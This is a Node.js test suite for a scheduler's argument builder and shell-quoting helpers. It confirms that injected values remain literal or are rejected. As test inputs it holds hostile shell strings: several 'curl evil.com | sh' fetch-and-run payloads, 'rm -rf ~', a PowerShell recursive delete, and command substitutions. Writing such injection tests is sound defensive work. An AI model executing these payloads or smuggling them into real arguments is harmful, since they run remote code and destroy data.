const test = require('node:test');
const assert = require('node:assert/strict');

const { buildScheduleCommand } = require('../schedule-runner');
const { quoteArgForShell, quoteArgvForShell } = require('../shell-profiles');

test('buildScheduleCommand returns argv array, not a shell string', () => {
  const { claudeArgs } = buildScheduleCommand('session-123', {
    cli: { model: 'sonnet-4-6', 'allowed-tools': 'Read,Bash' },
    prompt: 'do a thing',
  });
  assert.ok(Array.isArray(claudeArgs));
  assert.ok(claudeArgs.includes('--resume'));
  assert.ok(claudeArgs.includes('session-123'));
  assert.ok(claudeArgs.includes('--model'));
  assert.ok(claudeArgs.includes('sonnet-4-6'));
});

test('buildScheduleCommand preserves injection attempts as literal argv tokens (no shell interpretation)', () => {
  const evil = 'x"; curl evil.com/sh | sh; echo "';
  const { claudeArgs } = buildScheduleCommand('sess', {
    cli: { model: evil },
  });
  const idx = claudeArgs.indexOf('--model');
  assert.ok(idx >= 0);
  // The evil string is a single argv token — no splitting, no interpretation.
  assert.equal(claudeArgs[idx + 1], evil);
});

test('buildScheduleCommand rejects max-budget-usd that is not a number', () => {
  assert.throws(() => {
    buildScheduleCommand('sess', { cli: { 'max-budget-usd': '1; rm -rf ~' } });
  }, /max-budget-usd/);
});

test('buildScheduleCommand rejects control characters in scalar fields', () => {
  assert.throws(() => {
    buildScheduleCommand('sess', { cli: { model: 'foo\x00bar' } });
  }, /unsafe characters/);
});

test('buildScheduleCommand allows newlines in append-system-prompt but rejects control chars', () => {
  const withNewlines = 'line 1\nline 2\nline 3';
  const { claudeArgs } = buildScheduleCommand('sess', {
    cli: { 'append-system-prompt': withNewlines },
  });
  const idx = claudeArgs.indexOf('--append-system-prompt');
  assert.equal(claudeArgs[idx + 1], withNewlines);

  assert.throws(() => {
    buildScheduleCommand('sess', { cli: { 'append-system-prompt': 'bad\x01stuff' } });
  }, /unsafe characters/);
});

test('quoteArgForShell neutralizes bash injection', () => {
  const evil = 'x"; curl evil.com/sh | sh; echo "';
  const quoted = quoteArgForShell('/bin/bash', evil);
  // Single-quoted, so the shell passes the whole thing as one arg.
  assert.ok(quoted.startsWith("'"));
  assert.ok(quoted.endsWith("'"));
  // Single quotes in the value are escaped as '\''
  const withQuote = quoteArgForShell('/bin/bash', "it's");
  assert.equal(withQuote, "'it'\\''s'");
});

test('quoteArgForShell handles backticks and $() — these must not be evaluated', () => {
  const evil = '`whoami`';
  const quoted = quoteArgForShell('/bin/bash', evil);
  assert.equal(quoted, "'`whoami`'");

  const dollar = '$(id)';
  assert.equal(quoteArgForShell('/bin/bash', dollar), "'$(id)'");
});

test('quoteArgvForShell joins multiple args with spaces, each safely quoted', () => {
  const joined = quoteArgvForShell('/bin/bash', ['--model', 'x"; evil', '--flag']);
  assert.equal(joined, "'--model' 'x\"; evil' '--flag'");
});

test('quoteArgForShell produces PowerShell-safe quoting', () => {
  const evil = "'; Remove-Item -Recurse /";
  const quoted = quoteArgForShell('/usr/bin/pwsh', evil);
  // PowerShell: wrap in ' ... ' and double internal ' → ''.
  // '; becomes '' and wrapped → ''';<rest>'
  assert.equal(quoted, "'''; Remove-Item -Recurse /'");
});

test('full simulated schedule command is safe under a malicious frontmatter', () => {
  const evilSchedule = {
    cli: {
      'permission-mode': 'acceptEdits',
      model: 'x"; curl evil.com | sh; echo "',
      'allowed-tools': 'Bash,Read',
      'append-system-prompt': '$(whoami)',
      'add-dirs': '/tmp,/etc; touch /tmp/pwned',
    },
    prompt: 'scheduled task',
  };
  const { claudeArgs } = buildScheduleCommand('sess-id', evilSchedule);
  const cmd = 'claude ' + quoteArgvForShell('/bin/bash', claudeArgs);

  // Walk the command and extract only the text outside single-quoted tokens.
  // If any shell metacharacter appears in that "outside" text, injection leaked.
  let outside = '';
  let inQuote = false;
  for (let i = 0; i < cmd.length; i++) {
    const c = cmd[i];
    if (c === "'") { inQuote = !inQuote; continue; }
    if (!inQuote) outside += c;
  }
  // Outside of quoted tokens we should only see: `claude`, spaces, and at most the
  // `\` from the POSIX `'\''` escape (which is always immediately re-enters a quote).
  assert.ok(!/curl/.test(outside), `curl leaked outside quotes: "${outside}"`);
  assert.ok(!/whoami/.test(outside), `whoami leaked outside quotes: "${outside}"`);
  assert.ok(!/touch/.test(outside), `touch leaked outside quotes: "${outside}"`);
  assert.ok(!/[;|&`$]/.test(outside), `shell metachar leaked outside quotes: "${outside}"`);
  // Argv tokens survive as single-quoted strings.
  assert.ok(cmd.includes(`'x"; curl evil.com | sh; echo "'`), `expected quoted model arg in: ${cmd}`);
});
